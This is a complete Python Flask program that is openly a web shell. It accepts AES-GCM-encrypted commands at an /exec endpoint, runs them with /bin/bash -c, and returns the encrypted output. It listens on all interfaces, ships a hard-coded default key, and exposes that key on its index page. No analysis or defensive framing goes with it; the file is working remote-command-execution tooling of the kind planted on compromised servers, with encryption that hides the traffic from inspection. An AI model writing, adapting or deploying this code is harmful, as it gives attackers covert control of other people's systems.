import os
import json
import base64
import subprocess
from flask import Flask, request, jsonify, render_template
from Crypto.Cipher import AES

app = Flask(__name__)

AES_KEY_HEX = os.environ.get(
    "WEBSHELL_AES_KEY",
    "a3f1b9c4d7e2f058619a4b7c8d0e1f2a3b4c5d6e7f80910a1b2c3d4e5f607180"
)
AES_KEY = bytes.fromhex(AES_KEY_HEX)

SHELL = os.environ.get("WEBSHELL_SHELL", "/bin/bash")
TIMEOUT = int(os.environ.get("WEBSHELL_TIMEOUT", "30"))


def decrypt_payload(data: dict) -> str:
    nonce = base64.b64decode(data["nonce"])
    ciphertext = base64.b64decode(data["ciphertext"])
    tag = base64.b64decode(data["tag"])
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode("utf-8")


def encrypt_payload(plaintext: str) -> dict:
    nonce = os.urandom(12)
    cipher = AES.new(AES_KEY, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode("utf-8"))
    return {
        "nonce": base64.b64encode(nonce).decode(),
        "ciphertext": base64.b64encode(ciphertext).decode(),
        "tag": base64.b64encode(tag).decode(),
    }


@app.route("/")
def index():
    return render_template("index.html", aes_key=AES_KEY_HEX)


@app.route("/exec", methods=["POST"])
def exec_command():
    try:
        data = request.get_json(force=True)
        command = decrypt_payload(data)
    except Exception:
        return jsonify(encrypt_payload("ERROR: Decryption failed")), 400

    try:
        result = subprocess.run(
            [SHELL, "-c", command],
            capture_output=True,
            text=True,
            timeout=TIMEOUT,
        )
        output = result.stdout
        if result.stderr:
            output += result.stderr
        if not output:
            output = "(no output)"
    except subprocess.TimeoutExpired:
        output = f"ERROR: Command timed out after {TIMEOUT}s"
    except Exception as e:
        output = f"ERROR: {str(e)}"

    return jsonify(encrypt_payload(output))


if __name__ == "__main__":
    host = os.environ.get("WEBSHELL_HOST", "0.0.0.0")
    port = int(os.environ.get("WEBSHELL_PORT", "8080"))
    debug = os.environ.get("WEBSHELL_DEBUG", "false").lower() == "true"
    app.run(host=host, port=port, debug=debug)
